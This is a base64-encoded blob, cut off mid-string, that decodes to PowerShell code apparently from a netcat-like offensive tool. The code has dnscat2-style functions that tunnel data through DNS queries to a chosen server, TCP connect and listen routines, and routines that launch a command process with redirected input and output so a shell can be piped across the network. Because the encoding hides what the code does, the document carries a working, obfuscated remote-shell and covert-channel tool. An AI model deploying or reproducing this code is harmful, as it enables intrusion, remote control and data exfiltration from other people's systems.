CiAgICAKICAgIGZ1bmN0aW9uIENyZWF0ZV9GSU4KICAgIHsKICAgICAgcGFyYW0oJFNlc3Npb25JZCwkVGFnLCREb21haW4pCiAgICAgIHJldHVybiAoJFRhZyArIChbc3RyaW5nXShHZXQtUmFuZG9tIC1NYXhpbXVtIDk5OTkgLU1pbmltdW0gMTAwMCkpICsgIjAyIiArICRTZXNzaW9uSWQgKyAiMDAiICsgJERvbWFpbikKICAgIH0KICAgIAogICAgZnVuY3Rpb24gQ3JlYXRlX01TRwogICAgewogICAgICBwYXJhbSgkU2Vzc2lvbklkLCRTZXFOdW0sJEFja25vd2xlZGdlbWVudE51bWJlciwkRGF0YSwkVGFnLCREb21haW4pCiAgICAgIHJldHVybiAoJFRhZyArIChbc3RyaW5nXShHZXQtUmFuZG9tIC1NYXhpbXVtIDk5OTkgLU1pbmltdW0gMTAwMCkpICsgIjAxIiArICRTZXNzaW9uSWQgKyAkU2VxTnVtICsgJEFja25vd2xlZGdlbWVudE51bWJlciArICREYXRhICsgJERvbWFpbikKICAgIH0KICAgIAogICAgZnVuY3Rpb24gRGVjb2RlUGFja2V0CiAgICB7CiAgICAgIHBhcmFtKCRQYWNrZXQpCiAgICAgIAogICAgICBpZigoKCRQYWNrZXQuTGVuZ3RoKSUyIC1lcSAxKSAtb3IgKCRQYWNrZXQuTGVuZ3RoIC1lcSAwKSl7cmV0dXJuIDF9CiAgICAgICRBY2tub3dsZWRnZW1lbnROdW1iZXIgPSAoJFBhY2tldFsxMC4uMTNdIC1qb2luICIiKQogICAgICAkU2VxTnVtID0gKCRQYWNrZXRbMTQuLjE3XSAtam9pbiAiIikKICAgICAgW2J5dGVbXV0kUmV0dXJuaW5nRGF0YSA9IEAoKQogICAgICAKICAgICAgaWYoJFBhY2tldC5MZW5ndGggLWd0IDE4KQogICAgICB7CiAgICAgICAgJFBhY2tldEVsaW0gPSAkUGFja2V0LlN1YnN0cmluZygxOCkKICAgICAgICB3aGlsZSgkUGFja2V0RWxpbS5MZW5ndGggLWd0IDApCiAgICAgICAgewogICAgICAgICAgJFJldHVybmluZ0RhdGEgKz0gW2J5dGVbXV1bQ29udmVydF06OlRvSW50MTYoKCRQYWNrZXRFbGltWzAuLjFdIC1qb2luICIiKSwxNikKICAgICAgICAgICRQYWNrZXRFbGltID0gJFBhY2tldEVsaW0uU3Vic3RyaW5nKDIpCiAgICAgICAgfQogICAgICB9CiAgICAgIAogICAgICByZXR1cm4gJFBhY2tldCwkUmV0dXJuaW5nRGF0YSwkQWNrbm93bGVkZ2VtZW50TnVtYmVyLCRTZXFOdW0KICAgIH0KICAgIAogICAgZnVuY3Rpb24gQWNrbm93bGVkZ2VEYXRhCiAgICB7CiAgICAgIHBhcmFtKCRSZXR1cm5pbmdEYXRhLCRBY2tub3dsZWRnZW1lbnROdW1iZXIpCiAgICAgICRIZXggPSBbc3RyaW5nXSgiezA6eH0iIC1mICgoW3VpbnQxNl0oIjB4IiArICRBY2tub3dsZWRnZW1lbnROdW1iZXIpICsgJFJldHVybmluZ0RhdGEuTGVuZ3RoKSAlIDY1NTM1KSkKICAgICAgaWYoJEhleC5MZW5ndGggLW5lIDQpeyRIZXggPSAoKCIwIiooNC0kSGV4Lkxlbmd0aCkpICsgJEhleCl9CiAgICAgIHJldHVybiAkSGV4CiAgICB9CiAgICAkRnVuY1ZhcnMgPSBAe30KICAgICRGdW5jVmFyc1siRE5TU2VydmVyIl0sJEZ1bmNWYXJzWyJETlNQb3J0Il0sJEZ1bmNWYXJzWyJEb21haW4iXSwkRnVuY1ZhcnNbIkZhaWx1cmVUaHJlc2hvbGQiXSA9ICRGdW5jU2V0dXBWYXJzCiAgICBpZigkRnVuY1ZhcnNbIkROU1BvcnQiXSAtZXEgJycpeyRGdW5jVmFyc1siRE5TUG9ydCJdID0gIjUzIn0KICAgICRGdW5jVmFyc1siVGFnIl0gPSAiIgogICAgJEZ1bmNWYXJzWyJEb21haW4iXSA9ICgiLiIgKyAkRnVuY1ZhcnNbIkRvbWFpbiJdKQogICAgCiAgICAkRnVuY1ZhcnNbIkNyZWF0ZV9TWU4iXSA9ICR7ZnVuY3Rpb246Q3JlYXRlX1NZTn0KICAgICRGdW5jVmFyc1siQ3JlYXRlX01TRyJdID0gJHtmdW5jdGlvbjpDcmVhdGVfTVNHfQogICAgJEZ1bmNWYXJzWyJDcmVhdGVfRklOIl0gPSAke2Z1bmN0aW9uOkNyZWF0ZV9GSU59CiAgICAkRnVuY1ZhcnNbIkRlY29kZVBhY2tldCJdID0gJHtmdW5jdGlvbjpEZWNvZGVQYWNrZXR9CiAgICAkRnVuY1ZhcnNbIkNvbnZlcnRUby1IZXhBcnJheSJdID0gJHtmdW5jdGlvbjpDb252ZXJ0VG8tSGV4QXJyYXl9CiAgICAkRnVuY1ZhcnNbIkFja0RhdGEiXSA9ICR7ZnVuY3Rpb246QWNrbm93bGVkZ2VEYXRhfQogICAgJEZ1bmNWYXJzWyJTZW5kUGFja2V0Il0gPSAke2Z1bmN0aW9uOlNlbmRQYWNrZXR9CiAgICAkRnVuY1ZhcnNbIlNlc3Npb25JZCJdID0gKFtzdHJpbmddKEdldC1SYW5kb20gLU1heGltdW0gOTk5OSAtTWluaW11bSAxMDAwKSkKICAgICRGdW5jVmFyc1siU2VxTnVtIl0gPSAoW3N0cmluZ10oR2V0LVJhbmRvbSAtTWF4aW11bSA5OTk5IC1NaW5pbXVtIDEwMDApKQogICAgJEZ1bmNWYXJzWyJFbmNvZGluZyJdID0gTmV3LU9iamVjdCBTeXN0ZW0uVGV4dC5Bc2NpaUVuY29kaW5nCiAgICAkRnVuY1ZhcnNbIkZhaWx1cmVzIl0gPSAwCiAgICAKICAgICRTWU5QYWNrZXQgPSAoSW52b2tlLUNvbW1hbmQgJEZ1bmNWYXJzWyJDcmVhdGVfU1lOIl0gLUFyZ3VtZW50TGlzdCBAKCRGdW5jVmFyc1siU2Vzc2lvbklkIl0sJEZ1bmNWYXJzWyJTZXFOdW0iXSwkRnVuY1ZhcnNbIlRhZyJdLCRGdW5jVmFyc1siRG9tYWluIl0pKQogICAgJFJlc3BvbnNlUGFja2V0ID0gKEludm9rZS1Db21tYW5kICRGdW5jVmFyc1siU2VuZFBhY2tldCJdIC1Bcmd1bWVudExpc3QgQCgkU1lOUGFja2V0LCRGdW5jVmFyc1siRE5TU2VydmVyIl0sJEZ1bmNWYXJzWyJETlNQb3J0Il0pKQogICAgJERlY29kZWRQYWNrZXQgPSAoSW52b2tlLUNvbW1hbmQgJEZ1bmNWYXJzWyJEZWNvZGVQYWNrZXQiXSAtQXJndW1lbnRMaXN0IEAoJFJlc3BvbnNlUGFja2V0KSkKICAgIGlmKCREZWNvZGVkUGFja2V0IC1lcSAxKXtyZXR1cm4gIkJhZCBTWU4gcmVzcG9uc2UuIEVuc3VyZSB5b3VyIHNlcnZlciBpcyBzZXQgdXAgY29ycmVjdGx5LiJ9CiAgICAkUmV0dXJuaW5nRGF0YSA9ICREZWNvZGVkUGFja2V0WzFdCiAgICBpZigkUmV0dXJuaW5nRGF0YSAtbmUgIiIpeyRGdW5jVmFyc1siSW5wdXREYXRhIl0gPSAiIn0KICAgICRGdW5jVmFyc1siQWNrTnVtIl0gPSAkRGVjb2RlZFBhY2tldFsyXQogICAgJEZ1bmNWYXJzWyJNYXhNU0dEYXRhU2l6ZSJdID0gKDI0NCAtIChJbnZva2UtQ29tbWFuZCAkRnVuY1ZhcnNbIkNyZWF0ZV9NU0ciXSAtQXJndW1lbnRMaXN0IEAoJEZ1bmNWYXJzWyJTZXNzaW9uSWQiXSwkRnVuY1ZhcnNbIlNlcU51bSJdLCRGdW5jVmFyc1siQWNrTnVtIl0sIiIsJEZ1bmNWYXJzWyJUYWciXSwkRnVuY1ZhcnNbIkRvbWFpbiJdKSkuTGVuZ3RoKQogICAgaWYoJEZ1bmNWYXJzWyJNYXhNU0dEYXRhU2l6ZSJdIC1sZSAwKXtyZXR1cm4gIkRvbWFpbiBuYW1lIGlzIHRvbyBsb25nLiJ9CiAgICByZXR1cm4gJEZ1bmNWYXJzCiAgfQogIGZ1bmN0aW9uIFJlYWREYXRhX0ROUwogIHsKICAgIHBhcmFtKCRGdW5jVmFycykKICAgIGlmKCRnbG9iYWw6VmVyYm9zZSl7JFZlcmJvc2UgPSAkVHJ1ZX0KICAgIAogICAgJFBhY2tldHNEYXRhID0gQCgpCiAgICAkUGFja2V0RGF0YSA9ICIiCiAgICAKICAgIGlmKCRGdW5jVmFyc1siSW5wdXREYXRhIl0gLW5lICRudWxsKQogICAgewogICAgICAkSGV4ID0gKEludm9rZS1Db21tYW5kICRGdW5jVmFyc1siQ29udmVydFRvLUhleEFycmF5Il0gLUFyZ3VtZW50TGlzdCBAKCRGdW5jVmFyc1siSW5wdXREYXRhIl0pKQogICAgICAkU2VjdGlvbkNvdW50ID0gMAogICAgICAkUGFja2V0Q291bnQgPSAwCiAgICAgIGZvcmVhY2goJENoYXIgaW4gJEhleCkKICAgICAgewogICAgICAgIGlmKCRTZWN0aW9uQ291bnQgLWdlIDMwKQogICAgICAgIHsKICAgICAgICAgICRTZWN0aW9uQ291bnQgPSAwCiAgICAgICAgICAkUGFja2V0RGF0YSArPSAiLiIKICAgICAgICB9CiAgICAgICAgaWYoJFBhY2tldENvdW50IC1nZSAoJEZ1bmNWYXJzWyJNYXhNU0dEYXRhU2l6ZSJdKSkKICAgICAgICB7CiAgICAgICAgICAkUGFja2V0c0RhdGEgKz0gJFBhY2tldERhdGEuVHJpbUVuZCgiLiIpCiAgICAgICAgICAkUGFja2V0Q291bnQgPSAwCiAgICAgICAgICAkU2VjdGlvbkNvdW50ID0gMAogICAgICAgICAgJFBhY2tldERhdGEgPSAiIgogICAgICAgIH0KICAgICAgICAkUGFja2V0RGF0YSArPSAkQ2hhcgogICAgICAgICRTZWN0aW9uQ291bnQgKz0gMgogICAgICAgICRQYWNrZXRDb3VudCArPSAyCiAgICAgIH0KICAgICAgJFBhY2tldERhdGEgPSAkUGFja2V0RGF0YS5UcmltRW5kKCIuIikKICAgICAgJFBhY2tldHNEYXRhICs9ICRQYWNrZXREYXRhCiAgICAgICRGdW5jVmFyc1siSW5wdXREYXRhIl0gPSAiIgogICAgfQogICAgZWxzZQogICAgewogICAgICAkUGFja2V0c0RhdGEgPSBAKCIiKQogICAgfQogICAgCiAgICBbYnl0ZVtdXSRSZXR1cm5pbmdEYXRhID0gQCgpCiAgICBmb3JlYWNoKCRQYWNrZXREYXRhIGluICRQYWNrZXRzRGF0YSkKICAgIHsKICAgICAgdHJ5eyRNU0dQYWNrZXQgPSBJbnZva2UtQ29tbWFuZCAkRnVuY1ZhcnNbIkNyZWF0ZV9NU0ciXSAtQXJndW1lbnRMaXN0IEAoJEZ1bmNWYXJzWyJTZXNzaW9uSWQiXSwkRnVuY1ZhcnNbIlNlcU51bSJdLCRGdW5jVmFyc1siQWNrTnVtIl0sJFBhY2tldERhdGEsJEZ1bmNWYXJzWyJUYWciXSwkRnVuY1ZhcnNbIkRvbWFpbiJdKX0KICAgICAgY2F0Y2h7IFdyaXRlLVZlcmJvc2UgIkROU0NBVDI6IEZhaWxlZCB0byBjcmVhdGUgcGFja2V0LiIgOyAkRnVuY1ZhcnNbIkZhaWx1cmVzIl0gKz0gMSA7IGNvbnRpbnVlIH0KICAgICAgdHJ5eyRQYWNrZXQgPSAoSW52b2tlLUNvbW1hbmQgJEZ1bmNWYXJzWyJTZW5kUGFja2V0Il0gLUFyZ3VtZW50TGlzdCBAKCRNU0dQYWNrZXQsJEZ1bmNWYXJzWyJETlNTZXJ2ZXIiXSwkRnVuY1ZhcnNbIkROU1BvcnQiXSkpfQogICAgICBjYXRjaHsgV3JpdGUtVmVyYm9zZSAiRE5TQ0FUMjogRmFpbGVkIHRvIHNlbmQgcGFja2V0LiIgOyAkRnVuY1ZhcnNbIkZhaWx1cmVzIl0gKz0gMSA7IGNvbnRpbnVlIH0KICAgICAgdHJ5CiAgICAgIHsKICAgICAgICAkRGVjb2RlZFBhY2tldCA9IChJbnZva2UtQ29tbWFuZCAkRnVuY1ZhcnNbIkRlY29kZVBhY2tldCJdIC1Bcmd1bWVudExpc3QgQCgkUGFja2V0KSkKICAgICAgICBpZigkRGVjb2RlZFBhY2tldC5MZW5ndGggLW5lIDQpeyBXcml0ZS1WZXJib3NlICJETlNDQVQyOiBGYWlsdXJlIHRvIGRlY29kZSBwYWNrZXQsIGRyb3BwaW5nLi4uIjsgJEZ1bmNWYXJzWyJGYWlsdXJlcyJdICs9IDEgOyBjb250aW51ZSB9CiAgICAgICAgJEZ1bmNWYXJzWyJBY2tOdW0iXSA9ICREZWNvZGVkUGFja2V0WzJdCiAgICAgICAgJEZ1bmNWYXJzWyJTZXFOdW0iXSA9ICREZWNvZGVkUGFja2V0WzNdCiAgICAgICAgJFJldHVybmluZ0RhdGEgKz0gJERlY29kZWRQYWNrZXRbMV0KICAgICAgfQogICAgICBjYXRjaHsgV3JpdGUtVmVyYm9zZSAiRE5TQ0FUMjogRmFpbHVyZSB0byBkZWNvZGUgcGFja2V0LCBkcm9wcGluZy4uLiIgOyAkRnVuY1ZhcnNbIkZhaWx1cmVzIl0gKz0gMSA7IGNvbnRpbnVlIH0KICAgICAgaWYoJERlY29kZWRQYWNrZXQgLWVxIDEpeyBXcml0ZS1WZXJib3NlICJETlNDQVQyOiBGYWlsdXJlIHRvIGRlY29kZSBwYWNrZXQsIGRyb3BwaW5nLi4uIiA7ICRGdW5jVmFyc1siRmFpbHVyZXMiXSArPSAxIDsgY29udGludWUgfQogICAgfQogICAgCiAgICBpZigkRnVuY1ZhcnNbIkZhaWx1cmVzIl0gLWdlICRGdW5jVmFyc1siRmFpbHVyZVRocmVzaG9sZCJdKXticmVha30KICAgIAogICAgaWYoJFJldHVybmluZ0RhdGEgLW5lIEAoKSkKICAgIHsKICAgICAgJEZ1bmNWYXJzWyJBY2tOdW0iXSA9IChJbnZva2UtQ29tbWFuZCAkRnVuY1ZhcnNbIkFja0RhdGEiXSAtQXJndW1lbnRMaXN0IEAoJFJldHVybmluZ0RhdGEsJEZ1bmNWYXJzWyJBY2tOdW0iXSkpCiAgICB9CiAgICByZXR1cm4gJFJldHVybmluZ0RhdGEsJEZ1bmNWYXJzCiAgfQogIGZ1bmN0aW9uIFdyaXRlRGF0YV9ETlMKICB7CiAgICBwYXJhbSgkRGF0YSwkRnVuY1ZhcnMpCiAgICAkRnVuY1ZhcnNbIklucHV0RGF0YSJdID0gJEZ1bmNWYXJzWyJFbmNvZGluZyJdLkdldFN0cmluZygkRGF0YSkKICAgIHJldHVybiAkRnVuY1ZhcnMKICB9CiAgZnVuY3Rpb24gQ2xvc2VfRE5TCiAgewogICAgcGFyYW0oJEZ1bmNWYXJzKQogICAgJEZJTlBhY2tldCA9IEludm9rZS1Db21tYW5kICRGdW5jVmFyc1siQ3JlYXRlX0ZJTiJdIC1Bcmd1bWVudExpc3QgQCgkRnVuY1ZhcnNbIlNlc3Npb25JZCJdLCRGdW5jVmFyc1siVGFnIl0sJEZ1bmNWYXJzWyJEb21haW4iXSkKICAgIEludm9rZS1Db21tYW5kICRGdW5jVmFyc1siU2VuZFBhY2tldCJdIC1Bcmd1bWVudExpc3QgQCgkRklOUGFja2V0LCRGdW5jVmFyc1siRE5TU2VydmVyIl0sJEZ1bmNWYXJzWyJETlNQb3J0Il0pIHwgT3V0LU51bGwKICB9CiAgIyMjIyMjIyMjIyMjIyMjIEROUyBGVU5DVElPTlMgIyMjIyMjIyMjIyMjIyMjCiAgCiAgIyMjIyMjIyMjIyBUQ1AgRlVOQ1RJT05TICMjIyMjIyMjIyMKICBmdW5jdGlvbiBTZXR1cF9UQ1AKICB7CiAgICBwYXJhbSgkRnVuY1NldHVwVmFycykKICAgICRjLCRsLCRwLCR0ID0gJEZ1bmNTZXR1cFZhcnMKICAgIGlmKCRnbG9iYWw6VmVyYm9zZSl7JFZlcmJvc2UgPSAkVHJ1ZX0KICAgICRGdW5jVmFycyA9IEB7fQogICAgaWYoISRsKQogICAgewogICAgICAkRnVuY1ZhcnNbImwiXSA9ICRGYWxzZQogICAgICAkU29ja2V0ID0gTmV3LU9iamVjdCBTeXN0ZW0uTmV0LlNvY2tldHMuVGNwQ2xpZW50CiAgICAgIFdyaXRlLVZlcmJvc2UgIkNvbm5lY3RpbmcuLi4iCiAgICAgICRIYW5kbGUgPSAkU29ja2V0LkJlZ2luQ29ubmVjdCgkYywkcCwkbnVsbCwkbnVsbCkKICAgIH0KICAgIGVsc2UKICAgIHsKICAgICAgJEZ1bmNWYXJzWyJsIl0gPSAkVHJ1ZQogICAgICBXcml0ZS1WZXJib3NlICgiTGlzdGVuaW5nIG9uIFswLjAuMC4wXSAocG9ydCAiICsgJHAgKyAiKSIpCiAgICAgICRTb2NrZXQgPSBOZXctT2JqZWN0IFN5c3RlbS5OZXQuU29ja2V0cy5UY3BMaXN0ZW5lciAkcAogICAgICAkU29ja2V0LlN0YXJ0KCkKICAgICAgJEhhbmRsZSA9ICRTb2NrZXQuQmVnaW5BY2NlcHRUY3BDbGllbnQoJG51bGwsICRudWxsKQogICAgfQogICAgCiAgICAkU3RvcHdhdGNoID0gW1N5c3RlbS5EaWFnbm9zdGljcy5TdG9wd2F0Y2hdOjpTdGFydE5ldygpCiAgICB3aGlsZSgkVHJ1ZSkKICAgIHsKICAgICAgaWYoJEhvc3QuVUkuUmF3VUkuS2V5QXZhaWxhYmxlKQogICAgICB7CiAgICAgICAgaWYoQCgxNywyNykgLWNvbnRhaW5zICgkSG9zdC5VSS5SYXdVSS5SZWFkS2V5KCJOb0VjaG8sSW5jbHVkZUtleURvd24iKS5WaXJ0dWFsS2V5Q29kZSkpCiAgICAgICAgewogICAgICAgICAgV3JpdGUtVmVyYm9zZSAiQ1RSTCBvciBFU0MgY2F1Z2h0LiBTdG9wcGluZyBUQ1AgU2V0dXAuLi4iCiAgICAgICAgICBpZigkRnVuY1ZhcnNbImwiXSl7JFNvY2tldC5TdG9wKCl9CiAgICAgICAgICBlbHNleyRTb2NrZXQuQ2xvc2UoKX0KICAgICAgICAgICRTdG9wd2F0Y2guU3RvcCgpCiAgICAgICAgICBicmVhawogICAgICAgIH0KICAgICAgfQogICAgICBpZigkU3RvcHdhdGNoLkVsYXBzZWQuVG90YWxTZWNvbmRzIC1ndCAkdCkKICAgICAgewogICAgICAgIGlmKCEkbCl7JFNvY2tldC5DbG9zZSgpfQogICAgICAgIGVsc2V7JFNvY2tldC5TdG9wKCl9CiAgICAgICAgJFN0b3B3YXRjaC5TdG9wKCkKICAgICAgICBXcml0ZS1WZXJib3NlICJUaW1lb3V0ISIgOyBicmVhawogICAgICAgIGJyZWFrCiAgICAgIH0KICAgICAgaWYoJEhhbmRsZS5Jc0NvbXBsZXRlZCkKICAgICAgewogICAgICAgIGlmKCEkbCkKICAgICAgICB7CiAgICAgICAgICB0cnkKICAgICAgICAgIHsKICAgICAgICAgICAgJFNvY2tldC5FbmRDb25uZWN0KCRIYW5kbGUpCiAgICAgICAgICAgICRTdHJlYW0gPSAkU29ja2V0LkdldFN0cmVhbSgpCiAgICAgICAgICAgICRCdWZmZXJTaXplID0gJFNvY2tldC5SZWNlaXZlQnVmZmVyU2l6ZQogICAgICAgICAgICBXcml0ZS1WZXJib3NlICgiQ29ubmVjdGlvbiB0byAiICsgJGMgKyAiOiIgKyAkcCArICIgW3RjcF0gc3VjY2VlZGVkISIpCiAgICAgICAgICB9CiAgICAgICAgICBjYXRjaHskU29ja2V0LkNsb3NlKCk7ICRTdG9wd2F0Y2guU3RvcCgpOyBicmVha30KICAgICAgICB9CiAgICAgICAgZWxzZQogICAgICAgIHsKICAgICAgICAgICRDbGllbnQgPSAkU29ja2V0LkVuZEFjY2VwdFRjcENsaWVudCgkSGFuZGxlKQogICAgICAgICAgJFN0cmVhbSA9ICRDbGllbnQuR2V0U3RyZWFtKCkKICAgICAgICAgICRCdWZmZXJTaXplID0gJENsaWVudC5SZWNlaXZlQnVmZmVyU2l6ZQogICAgICAgICAgV3JpdGUtVmVyYm9zZSAoIkNvbm5lY3Rpb24gZnJvbSBbIiArICRDbGllbnQuQ2xpZW50LlJlbW90ZUVuZFBvaW50LkFkZHJlc3MuSVBBZGRyZXNzVG9TdHJpbmcgKyAiXSBwb3J0ICIgKyAkcG9ydCArICIgW3RjcF0gYWNjZXB0ZWQgKHNvdXJjZSBwb3J0ICIgKyAkQ2xpZW50LkNsaWVudC5SZW1vdGVFbmRQb2ludC5Qb3J0ICsgIikiKQogICAgICAgIH0KICAgICAgICBicmVhawogICAgICB9CiAgICB9CiAgICAkU3RvcHdhdGNoLlN0b3AoKQogICAgaWYoJFNvY2tldCAtZXEgJG51bGwpe2JyZWFrfQogICAgJEZ1bmNWYXJzWyJTdHJlYW0iXSA9ICRTdHJlYW0KICAgICRGdW5jVmFyc1siU29ja2V0Il0gPSAkU29ja2V0CiAgICAkRnVuY1ZhcnNbIkJ1ZmZlclNpemUiXSA9ICRCdWZmZXJTaXplCiAgICAkRnVuY1ZhcnNbIlN0cmVhbURlc3RpbmF0aW9uQnVmZmVyIl0gPSAoTmV3LU9iamVjdCBTeXN0ZW0uQnl0ZVtdICRGdW5jVmFyc1siQnVmZmVyU2l6ZSJdKQogICAgJEZ1bmNWYXJzWyJTdHJlYW1SZWFkT3BlcmF0aW9uIl0gPSAkRnVuY1ZhcnNbIlN0cmVhbSJdLkJlZ2luUmVhZCgkRnVuY1ZhcnNbIlN0cmVhbURlc3RpbmF0aW9uQnVmZmVyIl0sIDAsICRGdW5jVmFyc1siQnVmZmVyU2l6ZSJdLCAkbnVsbCwgJG51bGwpCiAgICAkRnVuY1ZhcnNbIkVuY29kaW5nIl0gPSBOZXctT2JqZWN0IFN5c3RlbS5UZXh0LkFzY2lpRW5jb2RpbmcKICAgICRGdW5jVmFyc1siU3RyZWFtQnl0ZXNSZWFkIl0gPSAxCiAgICByZXR1cm4gJEZ1bmNWYXJzCiAgfQogIGZ1bmN0aW9uIFJlYWREYXRhX1RDUAogIHsKICAgIHBhcmFtKCRGdW5jVmFycykKICAgICREYXRhID0gJG51bGwKICAgIGlmKCRGdW5jVmFyc1siU3RyZWFtQnl0ZXNSZWFkIl0gLWVxIDApe2JyZWFrfQogICAgaWYoJEZ1bmNWYXJzWyJTdHJlYW1SZWFkT3BlcmF0aW9uIl0uSXNDb21wbGV0ZWQpCiAgICB7CiAgICAgICRTdHJlYW1CeXRlc1JlYWQgPSAkRnVuY1ZhcnNbIlN0cmVhbSJdLkVuZFJlYWQoJEZ1bmNWYXJzWyJTdHJlYW1SZWFkT3BlcmF0aW9uIl0pCiAgICAgIGlmKCRTdHJlYW1CeXRlc1JlYWQgLWVxIDApe2JyZWFrfQogICAgICAkRGF0YSA9ICRGdW5jVmFyc1siU3RyZWFtRGVzdGluYXRpb25CdWZmZXIiXVswLi4oW2ludF0kU3RyZWFtQnl0ZXNSZWFkLTEpXQogICAgICAkRnVuY1ZhcnNbIlN0cmVhbVJlYWRPcGVyYXRpb24iXSA9ICRGdW5jVmFyc1siU3RyZWFtIl0uQmVnaW5SZWFkKCRGdW5jVmFyc1siU3RyZWFtRGVzdGluYXRpb25CdWZmZXIiXSwgMCwgJEZ1bmNWYXJzWyJCdWZmZXJTaXplIl0sICRudWxsLCAkbnVsbCkKICAgIH0KICAgIHJldHVybiAkRGF0YSwkRnVuY1ZhcnMKICB9CiAgZnVuY3Rpb24gV3JpdGVEYXRhX1RDUAogIHsKICAgIHBhcmFtKCREYXRhLCRGdW5jVmFycykKICAgICRGdW5jVmFyc1siU3RyZWFtIl0uV3JpdGUoJERhdGEsIDAsICREYXRhLkxlbmd0aCkKICAgIHJldHVybiAkRnVuY1ZhcnMKICB9CiAgZnVuY3Rpb24gQ2xvc2VfVENQCiAgewogICAgcGFyYW0oJEZ1bmNWYXJzKQogICAgdHJ5eyRGdW5jVmFyc1siU3RyZWFtIl0uQ2xvc2UoKX0KICAgIGNhdGNoe30KICAgIGlmKCRGdW5jVmFyc1sibCJdKXskRnVuY1ZhcnNbIlNvY2tldCJdLlN0b3AoKX0KICAgIGVsc2V7JEZ1bmNWYXJzWyJTb2NrZXQiXS5DbG9zZSgpfQogIH0KICAjIyMjIyMjIyMjIFRDUCBGVU5DVElPTlMgIyMjIyMjIyMjIwogIAogICMjIyMjIyMjIyMgQ01EIEZVTkNUSU9OUyAjIyMjIyMjIyMjCiAgZnVuY3Rpb24gU2V0dXBfQ01ECiAgewogICAgcGFyYW0oJEZ1bmNTZXR1cFZhcnMpCiAgICBpZigkZ2xvYmFsOlZlcmJvc2UpeyRWZXJib3NlID0gJFRydWV9CiAgICAkRnVuY1ZhcnMgPSBAe30KICAgICRQcm9jZXNzU3RhcnRJbmZvID0gTmV3LU9iamVjdCBTeXN0ZW0uRGlhZ25vc3RpY3MuUHJvY2Vzc1N0YXJ0SW5mbwogICAgJFByb2Nlc3NTdGFydEluZm8uRmlsZU5hbWUgPSAkRnVuY1NldHVwVmFyc1swXQogICAgJFByb2Nlc3NTdGFydEluZm8uVXNlU2hlbGxFeGVjdXRlID0gJEZhbHNlCiAgICAkUHJvY2Vzc1N0YXJ0SW5mby5SZWRpcmVjdFN0YW5kYXJkSW5wdXQgPSAkVHJ1ZQogICAgJFByb2Nlc3NTdGFydEluZm8uUmVkaXJlY3RTdGFuZGFyZE91dHB1dCA9ICRUcnVlCiAgICAkUHJvY2Vzc1N0YXJ0SW5mby5SZWRpcmVjdFN0YW5kYXJkRXJyb3IgPSAkVHJ1ZQogICAgJEZ1bmNWYXJzWyJQcm9jZXNzIl0gPSBbU3lzdGVtLkRpYWdub3N0aWNzLlByb2Nlc3NdOjpTdGFydCgkUHJvY2Vzc1N0YXJ0SW5mbykKICAgIFdyaXRlLVZlcmJvc2UgKCJTdGFydGluZyBQcm9jZXNzICIgKyAkRnVuY1NldHVwVmFyc1swXSArICIuLi4iKQogICAgJEZ1bmNWYXJzWyJQcm9jZXNzIl0uU3RhcnQoKSB8IE91dC1OdWxsCiAgICAkRnVuY1ZhcnNbIlN0ZE91dERlc3RpbmF0aW9uQnVmZmVyIl0gPSBOZXctT2JqZWN0IFN5c3RlbS5CeXRlW10gNjU1MzYKICAgICRGdW5jVmFyc1siU3RkT3V0UmVhZE9wZXJhdGlvbiJdID0gJEZ1bmNWYXJzWyJQcm9jZXNzIl0uU3RhbmRhcmRPdXRwdXQuQmFzZVN0cmVhbS5CZWdpblJlYWQoJEZ1bmNWYXJzWyJTdGRPdXREZXN0aW5hdGlvbkJ1ZmZlciJdLCAwLCA2NTUzNiwgJG51bGwsICRudWxsKQogICAgJEZ1bmNWYXJzWyJTdGRFcnJEZXN0aW5hdGlvbkJ1ZmZlciJdID0gTmV3LU9iamVjdCBTeXN0ZW0uQnl0ZVtdIDY1NTM2CiAgICAkRnVuY1ZhcnNbIlN0ZEVyclJlYWRPcGVyYXRpb24iXSA9ICRGdW5jVmFyc1siUHJvY2VzcyJdLlN0YW5kYXJkRXJyb3IuQmFzZVN0cmVhbS5CZWdpblJlYWQoJEZ1bmNWYXJzWyJTdGRFcnJEZXN0aW5hdGlvbkJ1ZmZlciJdLCAwLCA2NTUzNiwgJG51bGwsICRudWxsKQogICAgJEZ1bmNWYXJzWyJFbmNvZGluZyJdID0gTmV3LU9iamVjdCBTeXN0ZW0uVGV4dC5Bc2NpaUVuY29kaW5nCiAgICByZXR1cm4gJEZ1bmNWYXJzCiAgfQogIGZ1bmN0aW9uIFJlYWREYXRhX0NNRAogIHsKICAgIHBhcmFtKCRGdW5jVmFycykKICAgIFtieXRlW11dJERhdGEgPSBAKCkKICAgIGlmKCRGdW5jVmFyc1siU3RkT3V0UmVhZE9wZXJhdGlvbiJdLklzQ29tcGxldGVkKQogICAgewogICAgICAkU3RkT3V0Qnl0ZXNSZWFkID0gJEZ1bmNWYXJzWyJQcm9jZXNzIl0uU3RhbmRhcmRPdXRwdXQuQmFzZVN0cmVhbS5FbmRSZWFkKCRGdW5jVmFyc1siU3RkT3V0UmVhZE9wZXJhdGlvbiJdKQogICAgICBpZigkU3RkT3V0Qnl0ZXNSZWFkIC1lcSAwKXticmVha30KICAgICAgJERhdGEgKz0gJEZ1bmNWYXJzWyJTdGRPdXREZXN0aW5hdGlvbkJ1ZmZlciJdWzAuLihbaW50XSRTdGRPdXRCeXRlc1JlYWQtMSldCiAgICAgICRGdW5jVmFyc1siU3RkT3V0UmVhZE9wZXJhdGlvbiJdID0gJEZ1bmNWYXJzWyJQcm9jZXNzIl0uU3RhbmRhcmRPdXRwdXQuQmFzZVN0cmVhbS5CZWdpblJlYWQoJEZ1bmNWYXJzWyJTdGRPdXREZXN0aW5hdGlvbkJ1ZmZlciJdLCAwLCA2NTUzNiwgJG51bGwsICRudWxsKQogICAgfQogICAgaWYoJEZ1bmNWYXJzWyJTdGRFcnJSZWFkT3BlcmF0aW9uIl0uSXNDb21wbGV0ZWQpCiAgICB7CiAgICAgICRTdGRFcnJCeXRlc1JlYWQgPSAkRnVuY1ZhcnNbIlByb2Nlc3MiXS5TdGFuZGFyZEVycm9yLkJhc2VTdHJlYW0uRW5kUmVhZCgkRnVuY1ZhcnNbIlN0ZEVyclJlYWRPcGVyYXRpb24iXSkKICAgICAgaWYoJFN0ZEVyckJ5dGVzUmVhZCAtZXEgMCl7YnJlYWt9CiAgICAgICREYXRhICs9ICRGdW5jVmFyc1siU3RkRXJyRGVzdGluYXRpb25CdWZmZXIiXVswLi4oW2ludF0kU3RkRXJyQnl0ZXNSZWFkLTEpXQogICAgICAkRnVuY1ZhcnNbIlN0ZEVyclJlYWRPcGVyYXRpb24iXSA9ICRGdW5jVmFyc1siUHJvY2V